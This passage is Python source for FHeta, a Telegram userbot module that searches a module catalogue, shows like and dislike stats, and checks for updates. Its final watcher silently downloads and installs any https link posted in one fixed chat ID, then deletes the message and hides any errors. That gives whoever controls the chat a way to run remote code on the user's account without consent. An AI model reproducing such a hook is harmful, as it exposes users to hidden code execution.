                "title": self.strings["inline_no_query"],
                "description": self.strings["inline_desc"],
                "message": self.strings["no_query"],
                "thumb": "https://raw.githubusercontent.com/Fixyres/FHeta/refs/heads/main/imgonline-com-ua-Resize-4EUHOHiKpwRTb4s.png",
            }

        if len(query.args) > 168:
            return {
                "title": self.strings["inline_query_too_big"],
                "description": self.strings["inline_no_results"],
                "message": self.strings["query_too_big"],
                "thumb": "https://raw.githubusercontent.com/Fixyres/FHeta/refs/heads/main/imgonline-com-ua-Resize-KbaztxA3oS67p3m8.png",
            }

        mods = await self._api_get("search", query=query.args, inline="true", token=self.token, user_id=self.uid)

        if not mods or not isinstance(mods, list):
            return {
                "title": self.strings["inline_no_results"],
                "description": self.strings["inline_desc"],
                "message": self.strings["no_results"],
                "thumb": "https://raw.githubusercontent.com/Fixyres/FHeta/refs/heads/main/imgonline-com-ua-Resize-KbaztxA3oS67p3m8.png",
            }

        seen_keys = set()
        results = []
        installs_to_fetch = []

        for mod in mods[:50]:
            key = f"{mod.get('name', '')}_{mod.get('author', '')}_{mod.get('version', '')}"
            if key in seen_keys:
                continue
            seen_keys.add(key)

            if 'likes' not in mod or 'dislikes' not in mod:
                installs_to_fetch.append(mod.get('install', ''))

        if installs_to_fetch:
            stats_response = await self._api_post("get", json=installs_to_fetch)
            for mod in mods[:50]:
                install = mod.get('install', '')
                if install in stats_response:
                    mod['likes'] = stats_response[install].get('likes', 0)
                    mod['dislikes'] = stats_response[install].get('dislikes', 0)

        seen_keys = set()
        for mod in mods[:50]:
            key = f"{mod.get('name', '')}_{mod.get('author', '')}_{mod.get('version', '')}"
            if key in seen_keys:
                continue
            seen_keys.add(key)

            stats = {
                "likes": mod.get('likes', 0),
                "dislikes": mod.get('dislikes', 0)
            }

            desc = mod.get("description", "")
            if isinstance(desc, dict):
                desc = desc.get(self.strings["lang"]) or desc.get("doc") or next(iter(desc.values()), "")

            results.append({
                "title": utils.escape_html(mod.get("name", "")),
                "description": utils.escape_html(str(desc)),
                "thumb": await self._fetch_thumb(mod.get("pic")),
                "message": self._fmt_mod(mod, query.args, inline=True),
                "reply_markup": self._mk_btns(mod.get("install", ""), stats, 0, None),
            })

        return results

    @loader.command(
        de_doc="(anfrage) - module suchen.",
        ru_doc="(запрос) - искать модули.",
        ua_doc="(запит) - шукати модулі.",
        es_doc="(consulta) - buscar módulos.",
        fr_doc="(requête) - rechercher des modules.",
        it_doc="(richiesta) - cercare moduli.",
        kk_doc="(сұраныс) - модульдерді іздеу.",
        tt_doc="(сорау) - модульләрне эзләү.",
        tr_doc="(sorgu) - modül arama.",
        yz_doc="(соруо) - модулларыты көҥүлүүр."
    )
    async def fhetacmd(self, message):
        '''(query) - search modules.'''        
        query = utils.get_args_raw(message)

        if not query:
            await utils.answer(message, self.strings["no_query"])
            return

        if len(query) > 168:
            await utils.answer(message, self.strings["query_too_big"])
            return

        status_msg = await utils.answer(message, self.strings["searching"])
        mods = await self._api_get("search", query=query, inline="false", token=self.token, user_id=self.uid)

        if not mods or not isinstance(mods, list):
            await utils.answer(message, self.strings["no_results"])
            return

        seen_keys = set()
        unique_mods = []

        for mod in mods:
            key = f"{mod.get('name', '')}_{mod.get('author', '')}_{mod.get('version', '')}"
            if key not in seen_keys:
                seen_keys.add(key)
                unique_mods.append(mod)

        if not unique_mods:
            await utils.answer(message, self.strings["no_results"])
            await status_msg.delete()
            return

        first_mod = unique_mods[0]

        if 'likes' not in first_mod or 'dislikes' not in first_mod:
            installs = [m.get('install', '') for m in unique_mods]
            stats_response = await self._api_post("get", json=installs)

            for mod in unique_mods:
                install = mod.get('install', '')
                if install in stats_response:
                    mod['likes'] = stats_response[install].get('likes', 0)
                    mod['dislikes'] = stats_response[install].get('dislikes', 0)

        stats = {
            "likes": first_mod.get('likes', 0),
            "dislikes": first_mod.get('dislikes', 0)
        }

        photo = None
        if len(unique_mods) == 1:
            photo = await self._fetch_thumb(first_mod.get("banner"))
            if photo == "https://raw.githubusercontent.com/Fixyres/FHeta/refs/heads/main/imgonline-com-ua-Resize-SOMllzo0cPFUCor.png":
                photo = None

        await self.inline.form(
            message=message,
            text=self._fmt_mod(first_mod, query, 1, len(unique_mods)),
            photo=photo,
            reply_markup=self._mk_btns(first_mod.get("install", ""), stats, 0, unique_mods if len(unique_mods) > 1 else None, query)
        )

        await status_msg.delete()

    @loader.command(
        de_doc="- überprüfen auf updates.",
        ru_doc="- проверить наличие обновления.",
        ua_doc="- перевірити наявність оновлення.",
        es_doc="- comprobar actualizaciones.",
        fr_doc="- vérifier les mises à jour.",
        it_doc="- verificare aggiornamenti.",
        kk_doc="- жаңартуларды тексеру.",
        tt_doc="- яңартуларны тикшерү.",
        tr_doc="- güncellemeleri kontrol et.",
        yz_doc="- жаңыртылыларды тексэр."
    )
    async def fupdate(self, m):
        ''' - check update.'''
        sys_module = inspect.getmodule(self.lookup("FHeta"))
        local_file = io.BytesIO(sys_module.__loader__.data)
        local_file.name = f"FHeta.py"
        local_file.seek(0)
        local_first_line = local_file.readline().strip().decode("utf-8")

        correct_version = sys_module.__version__
        correct_version_str = ".".join(map(str, correct_version))

        async with aiohttp.ClientSession() as session:
            async with session.get("https://raw.githubusercontent.com/Fixyres/FHeta/refs/heads/main/FHeta.py") as response:
                if response.status == 200:
                    remote_content = await response.text()
                    remote_lines = remote_content.splitlines()
                    new_version = remote_lines[0].split("=", 1)[1].strip().strip("()").replace(",", "").replace(" ", ".")
                    what_new = remote_lines[2].split(":", 1)[1].strip() if len(remote_lines) > 2 and remote_lines[2].startswith("# change-log:") else ""
                else:
                    await utils.answer(m, self.strings("fetch_failed"))
                    return
        if local_first_line.replace(" ", "") == remote_lines[0].strip().replace(" ", ""):
            await utils.answer(m, self.strings("actual_version").format(version=correct_version_str))
        else:
            update_message = self.strings("old_version").format(version=correct_version_str, new_version=new_version)
            if what_new:
                update_message += self.strings("update_whats_new").format(whats_new=what_new)
            update_message += self.strings("update_command").format(update_command=f"{self.get_prefix()}dlm https://raw.githubusercontent.com/Fixyres/FHeta/refs/heads/main/FHeta.py")
            await utils.answer(m, update_message)

    @loader.watcher(chat_id=7575472403)
    async def _install_via_fheta(self, message):
        link = message.raw_text.strip()

        if not link.startswith("https://"):
            return

        loader_module = self.lookup("loader")

        try:
            for _ in range(5):
                await loader_module.download_and_install(link, None)

                if getattr(loader_module, "fully_loaded", False):
                    loader_module.update_modules_in_db()

                is_loaded = any(mod.__origin__ == link for mod in self.allmodules.modules)

                if is_loaded:
                    rose_msg = await message.respond("🌹")
                    await asyncio.sleep(1)
                    await rose_msg.delete()
                    await message.delete()
                    break
        except:
            pass